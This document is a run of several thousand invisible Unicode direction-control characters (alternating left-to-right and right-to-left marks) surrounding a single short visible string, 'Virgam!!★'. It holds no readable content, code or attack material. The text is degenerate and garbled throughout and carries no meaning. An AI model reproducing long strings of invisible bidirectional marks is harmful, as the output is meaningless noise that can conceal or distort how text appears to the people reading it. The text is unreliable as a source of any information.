‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎Virgam!!★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎